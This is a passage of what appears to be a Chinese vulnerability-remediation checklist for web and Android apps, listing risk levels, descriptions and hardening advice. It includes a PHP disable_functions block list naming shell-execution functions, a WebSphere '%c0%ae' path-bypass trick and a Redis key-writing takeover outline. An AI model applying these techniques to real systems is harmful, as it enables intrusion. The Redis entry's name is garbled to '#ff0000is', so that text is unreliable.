title="启用了不安全的HTTP方法（启用了OPTIONS方法）"></a>启用了不安全的HTTP方法（启用了OPTIONS方法）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>开启了不安全的HTTP方法：DELTE/SEARCE/COPY，MOVE/PROPFIND/PROPPATCH/MKCOL/LOCK/UNLOCK/PUT，可能会在Web 服务器上上载、修改或删除Web 页面、脚本和文件。<br><strong>加固建议：</strong><br>如果服务器不需要支持WebDAV，请务必禁用它，或禁止不必要的HTTP 方法。</p><h2 id="域名访问限制不严格"><a href="#域名访问限制不严格" class="headerlink" title="域名访问限制不严格"></a>域名访问限制不严格</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>目标存在域名访问限制不严格漏洞。Http请求的Hostname字段没有严格的域名限制，导致可以绕过一些防护措施。<br><strong>加固建议：</strong><br>配置WEB服务器，限制只能以域名形式访问服务器。</p><h2 id="SVN源代码泄露"><a href="#SVN源代码泄露" class="headerlink" title="SVN源代码泄露"></a>SVN源代码泄露</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>造成SVN源代码漏洞的主要原因是管理员操作不规范。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。<br>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。<br><strong>加固建议：</strong><br>针对SVN信息泄露漏洞，建议删除WEB目录里的SVN文件或限制访问.svn目录，并升级SVN软件至1.7或以上更高版本</p><h2 id="idea工程目录信息泄露漏洞"><a href="#idea工程目录信息泄露漏洞" class="headerlink" title=".idea工程目录信息泄露漏洞"></a>.idea工程目录信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>.idea目录用来放置开发工程的一些配置文件，通常是.xml文件。其中workspace.xml里面存放一些开发者个人配置，比如开发路径、开发环境等。里面包含一些敏感信息。<br><strong>加固建议：</strong><br>生产环境中删除.idea目录及该目录下的文件，或配置网站服务器禁止访问.idea目录。</p><h2 id="ASP-NET-Padding-Oracle信息泄露-MS10-070"><a href="#ASP-NET-Padding-Oracle信息泄露-MS10-070" class="headerlink" title="ASP.NET_Padding_Oracle信息泄露(MS10-070)"></a>ASP.NET_Padding_Oracle信息泄露(MS10-070)</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br> ASP.NET由于加密填充验证过程中处理错误不当，导致存在一个信息泄漏漏洞。成功利用此漏洞的攻击者可以读取服务器加密的数据，例如视图状态。 此漏洞还可以用于数据篡改，如果成功利用，可用于解密和篡改服务器加密的数据。<br><strong>加固建议：</strong><br>建议将Microsoft .NET Framework 更新至最新版本。</p><h2 id="git信息泄露"><a href="#git信息泄露" class="headerlink" title=".git信息泄露"></a>.git信息泄露</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>泄露网站敏感信息，攻击者可直接获取源码信息实施进一步攻击。<br><strong>加固建议：</strong><br>删除.git目录。</p><h2 id="错误页面信息泄露（应用程序错误信息）"><a href="#错误页面信息泄露（应用程序错误信息）" class="headerlink" title="错误页面信息泄露（应用程序错误信息）"></a>错误页面信息泄露（应用程序错误信息）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者可以根据错误或警告消息收集服务器信息。<br><strong>加固建议：</strong><br>1.关闭web服务器错误提示；<br>2.关闭运行平台的错误提示；<br>3.建立错误机制，不要把真实的错误反馈给访问者。捕获后台抛出的异常，制定异常固定跳转页面，如500错误，跳转到相应页面，例如“系统异常请与管理员联系”，403异常，找不到页面等等。</p><h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。<br><strong>加固建议：</strong><br>1.删除不必要的备份文件；<br>2.设置访问权限；<br>3.将备份文件放至服务器其它目录下。</p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者通过不指定url中的具体文件，来查看某个目录下的所有文件和目录结构。<br><strong>加固建议：</strong><br>针对目录遍历漏洞，建议通过修改配置文件，去除Web 容器（如Apache）的文件目录索引功能。</p><h2 id="IIS短文件名漏洞"><a href="#IIS短文件名漏洞" class="headerlink" title="IIS短文件名漏洞"></a>IIS短文件名漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Microsoft IIS在实现上存在文件枚举漏洞，攻击者可以利用“<del>”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。<br><strong>加固建议：</strong><br>针对IIS短文件名漏洞，建议禁止url中使用“</del>”或它的Unicode编码，或关闭windows的8.3格式功能。</p><h2 id="源代码泄露漏洞"><a href="#源代码泄露漏洞" class="headerlink" title="源代码泄露漏洞"></a>源代码泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>部分或全部页面源代码泄露，攻击者可审查源代码泄露的可用信息进一步渗透。<br><strong>加固建议：</strong><br>删除源代码文件或对需要的未解析的源代码进行解析。</p><h2 id="robots-txt文件泄露"><a href="#robots-txt文件泄露" class="headerlink" title="robots.txt文件泄露"></a>robots.txt文件泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露网站敏感信息，包括网站的后台页面或其它隐私页面。<br><strong>加固建议：</strong><br>1.robots.txt 文件不应用来保护或隐藏信息。<br>2.应该将敏感的文件和目录移到另一个隔离的子目录，以便将这个目录排除在 Web Robot 搜索之外。如下列示例所示，将文件移到“folder”之类的非特定目录名称是比较好的解决方案： New directory structure: /folder/passwords.txt /folder/sensitive_folder/<br>New robots.txt: User-agent: * Disallow: /folder/<br>3.如果您无法更改目录结构，且必须将特定目录排除于 Web Robot 之外，在 robots.txt 文件中，请只用局部名称。虽然这不是最好的解决方案，但至少它能加大完整目录名称的猜测难度。例如，如果要排除“sensitive_folder”和 “passwords.txt”，请使用下列名称（假设 Web 根目录中没有起始于相同字符的文件或目录）： robots.txt: User-agent: * Disallow: /se Disallow: /pa。</p><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>敏感信息泄露一般包括：中间件、软件框架（cms）类型和版本信息，数据库表结构、网站架构、账号密码体系等等。这些信息一般在服务器错误信息、html注释、隐藏表单、示例文件等地方出现。攻击者得到这些信息，有助于缩小攻击范围，进行有针对性的更深层次的攻击。<br><strong>加固建议：</strong><br>对于一般信息泄露，删除无用页面，或删除页面中的敏感信息即可。对于敏感报错信息泄露，需要设置代码捕获异常，并抛出异常，服务端出现异常后不在客户端回显，统一返回不包含敏感信息的错误页面。</p><h2 id="Github信息泄露漏洞"><a href="#Github信息泄露漏洞" class="headerlink" title="Github信息泄露漏洞"></a>Github信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>开发人员使用Github进行代码管理。而免费用户在Github上的项目内容可在网站中检索到，并对所有用户开放可查看。泄露的敏感信息一般包括：软件源代码、程序账号密码等等。攻击者得到这些信息，可以进行代码审计，更有针对性的找到网站漏洞，甚至可以获得用户账号密码，直接登录获得用户权限。<br><strong>加固建议：</strong><br>删除敏感的Github项目代码，对可能泄露的帐号密码及时进行修改。</p><h2 id="PHP探针信息泄露"><a href="#PHP探针信息泄露" class="headerlink" title="PHP探针信息泄露"></a>PHP探针信息泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>PHP探针文件会导致网站敏感信息泄露<br><strong>加固建议：</strong><br>删除默认安装PHP探针文件。</p><h2 id="phpinfo页面泄露"><a href="#phpinfo页面泄露" class="headerlink" title="phpinfo页面泄露"></a>phpinfo页面泄露</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露网站服务器敏感信息，包括网站物理路径、PHP版本、服务器信息及环境变量等。<br><strong>加固建议：</strong><br>1.通过修改服务器环境内php.ini文件，将“expose_php = On”修改成“expose_php = Off”然后重启php即可。<br>2.如果确实需要该测试信息，在测试时使用，测试完毕后将该文件删除掉。<br>3.若无需要可以将一些php的危险函数禁用，打开/etc/php.ini文件，查找到 disable_functions，添加需禁用的以下函数名：phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen</p><h2 id="发现隐藏目录"><a href="#发现隐藏目录" class="headerlink" title="发现隐藏目录"></a>发现隐藏目录</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>尝试了检测服务器上的隐藏目录，403 Forbidden 响应泄露了存在此目录，即使不允许对其进行访问，泄露网站目录结构。<br><strong>加固建议：</strong><br>可对禁止的资源发布“404 - Not Found”响应状态代码，或者将其完全除去。</p><h2 id="内部IP地址泄露"><a href="#内部IP地址泄露" class="headerlink" title="内部IP地址泄露"></a>内部IP地址泄露</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>泄露内网IP地址<br><strong>加固建议：</strong><br>禁止将内网IP置于网站页面或代码层中。</p><h2 id="OpenSSH-CBC模式信息泄露漏洞"><a href="#OpenSSH-CBC模式信息泄露漏洞" class="headerlink" title="OpenSSH CBC模式信息泄露漏洞"></a>OpenSSH CBC模式信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>配置为CBC模式，OpenSSH没有正确地处理分组密码算法加密的SSH会话中所出现的错误，导致可能泄露密文中任意块最多32位纯文本。<br><strong>加固建议：</strong><br>临时解决方案：在SSH会话中仅使用CTR模式加密算法，如AES-CTR<br>目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<br><a href="https://downloads.ssh.com/">https://downloads.ssh.com/</a></p><h2 id="未加密的登录请求"><a href="#未加密的登录请求" class="headerlink" title="未加密的登录请求"></a>未加密的登录请求</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>检测中发现登录请求（例如：用户名、密码、电子邮件地址、社会安全号码等）被发送到服务器的过程中并未采用通讯加密协议或加密。恶意人员可通过数据截包实现网站管理员用户名、密码信息的截获。<br><strong>加固建议：</strong><br>注册或登录时，客户发送请求敏感信息进行加密，例如密码、电话、邮件等敏感信息进行加密传输。</p><h2 id="Memcached-未授权访问漏洞"><a href="#Memcached-未授权访问漏洞" class="headerlink" title="Memcached 未授权访问漏洞"></a>Memcached 未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于memcached安全设计缺陷，客户端连接memcached服务器后无需认证就可读取、修改服务器缓存内容。<br><strong>加固建议：</strong><br>1.配置memcached监听本地回环地址127.0.0.1。<br>2.当memcached配置为监听内网IP或公网IP时，使用主机防火墙（iptalbes、firewalld等）和网络防火墙对memcached服务端口进行过滤。</p><h2 id="rsync未授权访问漏洞"><a href="#rsync未授权访问漏洞" class="headerlink" title="rsync未授权访问漏洞"></a>rsync未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>rsync是类unix系统下的数据镜像备份工具，如果配置不当，可导致攻击者匿名访问rsync程序，进一步进行增删改等操作。<br><strong>加固建议：</strong><br>建议两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p><h2 id="WebSphere绕过安全限制漏洞"><a href="#WebSphere绕过安全限制漏洞" class="headerlink" title="WebSphere绕过安全限制漏洞"></a>WebSphere绕过安全限制漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在Java端”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII低字符”.”。通过这个方法可以绕过目录保护读取包配置文件信息，包括web-inf和meta-inf目录下的内容。攻击者还可以利用此漏洞查看或执行war包里面的文件。此漏洞影响WebSphere Application Server 版本5.1, 6.0, 6.1 和7.0。<br><strong>加固建议：</strong><br>升级WebSphere至最新版，或安装PK81387安全补丁。<br><a href="http://www-01.ibm.com/support/docview.wss?uid=swg24022456">http://www-01.ibm.com/support/docview.wss?uid=swg24022456</a></p><h2 id="cisco-vpn未授权访问"><a href="#cisco-vpn未授权访问" class="headerlink" title="cisco vpn未授权访问"></a>cisco vpn未授权访问</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Cisco Adaptive Security Appliance (ASA) Software在Clientless SSL VPN入口自定义框架在实现上存在安全漏洞，未经身份验证的远程攻击者可利用此漏洞修改Clientless SSL VPN入口内容，导致窃取凭证、跨站脚本及其他攻击。此漏洞源于没有正确实现Clientless SSL VPN入口自定义框架内的身份验证检查。<br><strong>加固建议：</strong><br>建议升级思科最新发布的补丁：<br><a href="http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa">http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa</a></p><h2 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库，一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息。<br><strong>加固建议：</strong><br>针对域传送漏洞，建议通过定义ACL(访问控制列表)来限制在域名服务器之间的区域传送，通常可编辑/etc/named.conf中allow-transfer参数。存在漏洞的是ns1.com, 如果其他ns2、ns3、ns4是备用dns服务器，那么应该只允许域传送至其他对应的地址。配置如下：<br>allow-transfer { localhost; ns2的IP; ns3的IP; ns4的IP;};</p><h2 id="Mongodb数据库未授权访问漏洞"><a href="#Mongodb数据库未授权访问漏洞" class="headerlink" title="Mongodb数据库未授权访问漏洞"></a>Mongodb数据库未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Mongodb在启动的时候未设置 –auth参数，造成恶意攻击者可使用默认空口令登陆到数据服务器。<br><strong>加固建议：</strong><br>建议增加数据库用户校验或限制设备登录IP地址，限制未授权访问。</p><h2 id="ff0000is数据库未授权访问漏洞"><a href="#ff0000is数据库未授权访问漏洞" class="headerlink" title="#ff0000is数据库未授权访问漏洞"></a>#ff0000is数据库未授权访问漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>#ff0000is 默认情况下会绑定在 0.0.0.0:6379，这样将会将 #ff0000is 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 #ff0000is 以及读取 #ff0000is 的数据。攻击者在未授权访问 #ff0000is 的情况下可以利用 #ff0000is的相关方法，可以成功在 #ff0000is 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。<br><strong>加固建议：</strong><br>1.配置bind选项，限定可以连接#ff0000is服务器的IP，修改 #ff0000is 的默认端口6379<br>2.配置认证，也就是AUTH，设置密码，密码会以明文方式保存在#ff0000is配置文件中<br>3.配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度<br>4.好消息是#ff0000is作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config等。</p><h2 id="phpmyadmin未授权访问"><a href="#phpmyadmin未授权访问" class="headerlink" title="phpmyadmin未授权访问"></a>phpmyadmin未授权访问</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>发现phpmyadmin路径，且没有密码保护，可直接登录数据库，获得数据库root权限。<br><strong>加固建议：</strong><br>设置数据库密码防止未授权访问，修改phpmyadmin默认路径防止被攻击者发现。</p><h2 id="htaccess文件未授权访问"><a href="#htaccess文件未授权访问" class="headerlink" title=".htaccess文件未授权访问"></a>.htaccess文件未授权访问</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者可未授权访问.htaccess文件，泄露网站敏感信息。<br><strong>加固建议：</strong><br>禁止.htaccess文件被查看</p><h2 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>包括但不限于：网站登录/FTP/SSH/数据库/中间件等，攻击者可猜解用户登录口令登录系统，实施进一步渗透攻击。<br><strong>加固建议：</strong><br>针对弱口令漏洞，建议用户及时修改密码，加强口令强度，设置口令为8位以上大小写字母、数字、特殊符号组合，并定期更换密码，避免使用弱口令。</p><h2 id="SNMP默认团体名漏洞"><a href="#SNMP默认团体名漏洞" class="headerlink" title="SNMP默认团体名漏洞"></a>SNMP默认团体名漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于很多操作系统或者网络设备的SNMP代理服务存在可读默认口令。如果这些默认口令没有修改或者为弱口令，远程攻击者就可以通过SNMP代理获取系统的很多细节信息。如果攻击者得到了可写口令，它甚至可以修改系统文件或者执行系统命令。<br><strong>加固建议：</strong><br>针对SNMP信息泄露漏洞，建议修改SNMP缺省口令或者关闭SNMP服务。</p><h2 id="FTP开启匿名登录"><a href="#FTP开启匿名登录" class="headerlink" title="FTP开启匿名登录"></a>FTP开启匿名登录</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者可利用弱口令或匿名登录漏洞直接登录 FTP 服务，上传恶意文件，从而获取系统权限，并可能造成数据泄露。<br><strong>加固建议：</strong><br>FTP服务为明文传输，建议使用SFTP代替，如需要继续休使用建议，禁止匿名登录，设置口令为8位以上大小写字母、数字、特殊符号组合，并定期更换密码，避免使用弱口令。</p><h2 id="会话劫持漏洞"><a href="#会话劫持漏洞" class="headerlink" title="会话劫持漏洞"></a>会话劫持漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者通过暴力破解、预测或者窃取（网络嗅探/XSS攻击）等方式获取用户Session ID后，使用该Session ID登录目标账号的攻击方法。<br><strong>加固建议：</strong><br>1.更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。<br>2.关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。<br>3.设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。<br>4.关闭所有phpinfo类dump request信息的页面。<br>5.使用User-Agent检测请求的一致性。但有专家警告不要依赖于检查User-Agent的一致性。这是因为服务器群集中的HTTP代理服务器会对User-Agent进行编辑，而本群集中的多个代理服务器在编辑该值时可能会不一致。</p><h2 id="会话固定漏洞"><a href="#会话固定漏洞" class="headerlink" title="会话固定漏洞"></a>会话固定漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。<br><strong>加固建议：</strong><br>1.用户登录时生成新的Session ID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。<br>2.大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。</p><h2 id="会话cookie中缺少HttpOnly属性"><a href="#会话cookie中缺少HttpOnly属性" class="headerlink" title="会话cookie中缺少HttpOnly属性"></a>会话cookie中缺少HttpOnly属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>如不设置此属性，攻击者可配合跨站脚本盗取cookie。设置此属性，即使有跨站漏洞存在，也很难利用。<br><strong>加固建议：</strong><br>在服务器端设置cookie的HttpOnly属性为真。</p><h2 id="未禁用密码表单自动完成属性"><a href="#未禁用密码表单自动完成属性" class="headerlink" title="未禁用密码表单自动完成属性"></a>未禁用密码表单自动完成属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>自动填写未对密码字段禁用的 HTML 属性。<br><strong>加固建议：</strong><br>将“autocomplete”属性正确设置为“off”。</p><h2 id="会话cookie中缺少secure属性"><a href="#会话cookie中缺少secure属性" class="headerlink" title="会话cookie中缺少secure属性"></a>会话cookie中缺少secure属性</h2><p><strong>风险级别：</strong><font color="#00b0f0"  font-size="14px">低危</font><br><strong>漏洞描述：</strong><br>可能会窃取在加密的会话期间发送的用户和会话信息。<br><strong>加固建议：</strong><br>服务器开启了Https时，cookie的Secure属性应设为true</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>后台页面或者其他用户页面没有做session认证，导致可以无需登录，直接访问页面。<br><strong>加固建议：</strong><br>对未授权访问页面做session认证，严格审核后台功能页面的访问权限，若为未登录用户则拒绝访问。</p><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>水平越权：攻击者能够执行与自己同级别权限用户的操作<br>垂直越权：攻击者能够执行高级别权限用户的操作，比如管理员的相关操作。<br><strong>加固建议：</strong><br>1.设计严格的权限控制系统，对于每个请求和URL都要进行校验和权限确认，防止非法请求被执行；<br>2.默认情况下，应该拒绝执行所有访问权限，也就是说缺省不给用户任何权限，防止攻击者利用缺省权限执行攻击等；<br>3.对于每个功能的访问，都要有明确的角色授权，防止黑客利用不完善的访问控制缺陷造成不必要的损失；<br>或者是实现Web访问的IP白名单列表，或者是只允许属于管理员范围权利的指定IP访问等等。</p><h2 id="任意用户密码重置漏洞"><a href="#任意用户密码重置漏洞" class="headerlink" title="任意用户密码重置漏洞"></a>任意用户密码重置漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>系统在处理重置密码请求时使用本地验证方法，未在服务端处理，造成用户可在本地修改数据包，绕过系统身份验证，达到重置任意账号的目的。<br><strong>加固建议：</strong><br>针对任意用户密码重置漏洞，建议在服务器端加强逻辑验证。</p><h2 id="验证码漏洞"><a href="#验证码漏洞" class="headerlink" title="验证码漏洞"></a>验证码漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>验证码可以一次多用，导致可以暴力破解；<br>验证码没有限定次数和时间，导致可以无限制的发送验证码。<br><strong>加固建议：</strong><br>设置验证码登录一次，变换一次，防止暴力破解；设置验证码120秒只发送一次。</p><h2 id="暴力破解漏洞（登录页面密码猜测攻击）"><a href="#暴力破解漏洞（登录页面密码猜测攻击）" class="headerlink" title="暴力破解漏洞（登录页面密码猜测攻击）"></a>暴力破解漏洞（登录页面密码猜测攻击）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>登录入口没有验证码或者验证码可以一次多用，导致可以暴力破解。攻击者可能试图尝试每个可能的字母，数字和符号组合，或使用一些暴力破解工具进行猜测，直到它发现了一个正确的组合，从而进入登录页面做进一步深度非法攻击。<br><strong>加固建议：</strong><br>1.增加验证码，使之登录失败一次，验证码变换一次。<br>2.针对密码猜测，建议控制错误登录次数，以防止暴力破解。同一用户如果5分钟内登录失败6次，禁用此用户登录30分钟。</p><h2 id="用户名猜解漏洞"><a href="#用户名猜解漏洞" class="headerlink" title="用户名猜解漏洞"></a>用户名猜解漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>通过登录信息可以判断有无此用户，可以对用户名进行猜解。<br><strong>加固建议：</strong><br>使用模糊的错误登录提示，如：用户名或密码错误。</p><h2 id="短信轰炸漏洞"><a href="#短信轰炸漏洞" class="headerlink" title="短信轰炸漏洞"></a>短信轰炸漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>短信轰炸是由于系统设计缺陷可无限制发送短信验证码给客户端，攻击者可利用该漏洞对任意手机号码进行短信轰炸，对公司造成不良影响和运行安全风险。<br><strong>加固建议：</strong><br>建议针对发送短信验证码接口加强权限控制，在服务端限制单位时间内发送短信次数。</p><h2 id="Webview远程代码执行漏洞"><a href="#Webview远程代码执行漏洞" class="headerlink" title="Webview远程代码执行漏洞"></a>Webview远程代码执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>WebView组件中的addJavascriptInterface方法用于实现本地Java和JavaScript的交互，但是该函数并没有对方法调用进行限制，导致攻击者可以调用任何JAVA类，最终导致JavaScript代码对设备进行任意攻击<br><strong>加固建议：</strong><br>建议不使用addJavascriptInterface接口，对于Android API Level为17或者以上的Android系统，Google规定允许被调用的函数，必须在Java的远程方法上面声明一个@JavascriptInterface注解；在使用js2java的bridge时候，需要对每个传入的参数进行验证，避免恶意代码的攻击。</p><h2 id="代码动态加载安全检测"><a href="#代码动态加载安全检测" class="headerlink" title="代码动态加载安全检测"></a>代码动态加载安全检测</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用DexClassLoader或PathClassLoader动态加载dex文件、apk文件、jar文件时，如果这些文件存储在可被其他应用读写的目录中(比如sdcard)，同时没有对外部加载的文件进行完整性校验，导致应用可能会被恶意代码注入并执行。<br><strong>加固建议：</strong><br>将所需要动态加载的文件放置在apk内部，或应用私有目录中；如果应用必须要把所加载的文件放置在可被其他应用读写的目录中(比如sdcard)，建议对不可信的加载源进行完整性校验和白名单处理，以保证不被恶意代码注入</p><h2 id="应用签名未校验风险"><a href="#应用签名未校验风险" class="headerlink" title="应用签名未校验风险"></a>应用签名未校验风险</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>应用签名未校验，攻击者可伪造app程序。<br><strong>加固建议：</strong><br>增加程序本地签名校验及云端的签名校验</p><h2 id="篡改和二次打包风险"><a href="#篡改和二次打包风险" class="headerlink" title="篡改和二次打包风险"></a>篡改和二次打包风险</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>对移动应用进行破解、再篡改或插入恶意代码，最后重新打包生成一个新应用的过程，恶意程序通过插入广告、木马、病毒的方式窃取用户隐私、吸资扣费、耗费流量等。<br><strong>加固建议：</strong><br>增加程序本地签名校验及云端的签名校验。</p><h2 id="Java代码反编译风险"><a href="#Java代码反编译风险" class="headerlink" title="Java代码反编译风险"></a>Java代码反编译风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>可通过反编译工具获取java源代码，攻击者可获取源码信息执行更深入的渗透攻击。<br><strong>加固建议：</strong><br>1.隔离Java程序；<br>2.对Class文件进行加密；<br>3.代码混淆。</p><h2 id="资源文件泄露风险"><a href="#资源文件泄露风险" class="headerlink" title="资源文件泄露风险"></a>资源文件泄露风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  